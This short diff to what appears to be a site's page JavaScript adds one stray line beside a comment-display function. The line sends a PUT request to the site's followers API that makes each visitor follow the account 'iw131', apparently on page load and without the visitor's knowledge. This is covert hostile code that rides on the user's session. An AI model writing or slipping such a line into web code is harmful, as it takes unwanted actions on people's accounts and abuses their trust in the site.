@@ -115,6 +115,8 @@
         }
     }
 
+    $.ajax({type:"PUT",url:"/site-api/users/followers/iw131/add/"});
+
     function displayCommentIds() {
         const comments = document.querySelectorAll('.comment');
         comments.forEach(comment => {
